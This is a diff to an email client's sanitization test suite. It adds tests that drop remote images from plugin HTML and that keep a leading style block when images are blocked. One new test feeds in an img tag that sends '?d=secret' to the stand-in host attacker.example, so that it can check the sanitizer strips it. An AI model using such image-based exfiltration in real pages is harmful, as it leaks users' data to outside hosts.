@@ -433,11 +433,11 @@ describe('email-sanitization', () => {
   describe('sanitizeI18nHtml', () => {
     it('preserves an authored target="_blank" and hardens rel (regression: DOMPurify strips target)', () => {
       const out = sanitizeI18nHtml(
-        'See the <a href="/docs/guides/account-security" class="underline" target="_blank">documentation</a>.',
+        'See the <a href="https://bulwarkmail.org/docs/guides/account-security" class="underline" target="_blank">documentation</a>.',
       );
       expect(out).toContain('target="_blank"');
       expect(out).toContain('rel="noopener noreferrer"');
-      expect(out).toContain('href="/docs/guides/account-security"');
+      expect(out).toContain('href="https://bulwarkmail.org/docs/guides/account-security"');
     });
 
     it('leaves links without a target untouched (no spurious new tab)', () => {
@@ -832,6 +832,17 @@ describe('email-sanitization', () => {
       expect(sanitizePluginBodyHtml('')).toBe('');
       expect(sanitizePluginBodyHtml('   ')).toBe('');
     });
+
+    it('drops remote images, which would carry data to any origin from the host page', () => {
+      // The sandbox CSP keeps a plugin to its manifest's httpOrigins; an
+      // https: image in text the host renders is a request to anywhere.
+      const out = sanitizePluginBodyHtml(
+        '<p>x</p><img src="https://attacker.example/x?d=secret"><img src="//attacker.example/y"><img src="data:image/png;base64,iVBORw0KGgo="><img src="cid:part1">',
+      );
+      expect(out).not.toContain('attacker.example');
+      expect(out).toContain('data:image/png;base64,');
+      expect(out).toContain('cid:part1');
+    });
   });
 
   // ALLOWED_URI_REGEXP excludes image/svg+xml on purpose (DOMPurify cannot see
@@ -945,6 +956,18 @@ describe('email-sanitization', () => {
       const img = parseHtmlSafely(result.html).querySelector('img')!;
       expect(img.getAttribute('src')).toBe(TRANSPARENT_BLOCKED_PIXEL);
       expect(img.getAttribute('data-blocked-src')).toBe('https://tracker.example/pixel.gif');
+    });
+
+    it('keeps a leading <style> block when it blocks an image', () => {
+      // Collapsing the emptied image cell re-parses the HTML; a <style> at the
+      // very start used to land in <head> there and get dropped, so the mail
+      // lost all its CSS until remote content was allowed.
+      const result = sanitizeEmailBodyForIframe(
+        '<style>.card { background: #fff; }</style><table><tr><td><img src="https://cdn.example/a.png"></td></tr></table>',
+        true,
+      );
+      expect(result.blockedExternalContent).toBe(true);
+      expect(result.html).toContain('<style>.card { background: #fff; }</style>');
     });
 
     it('leaves external images alone when blocking is off', () => {
